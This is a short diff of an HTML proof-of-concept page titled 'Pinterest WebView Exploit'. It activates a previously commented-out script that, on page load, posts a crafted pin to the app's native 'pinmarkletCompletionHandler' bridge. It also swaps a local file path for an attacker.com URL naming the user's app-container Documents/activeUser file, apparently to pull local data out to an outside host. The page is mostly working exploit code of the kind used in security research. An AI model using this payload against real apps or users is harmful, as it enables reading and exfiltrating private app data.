@@ -12,7 +12,7 @@
   </head>
   <body>
     <h1>Pinterest WebView Exploit</h1>
-    <!-- <script>
+    <script>
       setTimeout(() => {
         if (window.webkit?.messageHandlers?.pinmarkletCompletionHandler?.postMessage) {
           window.webkit.messageHandlers.pinmarkletCompletionHandler.postMessage({
@@ -20,13 +20,13 @@
               pin: {
                 title: "From Exploit",
                 description: "Try to read file",
-                url: "file:///private/var/mobile/Containers/Data/Application/DE1F2730-70D5-4898-AA09-B584FBCDEC23/Documents"
+                url: "https://attacker.com/malicious?file=/private/var/mobile/DE1F2730-70D5-4898-AA09-B584FBCDEC23/Documents/activeUser"
               }
             }
           });
         }
       }, 1000);
-    </script> -->
+    </script>
   </body>
 </html>
 
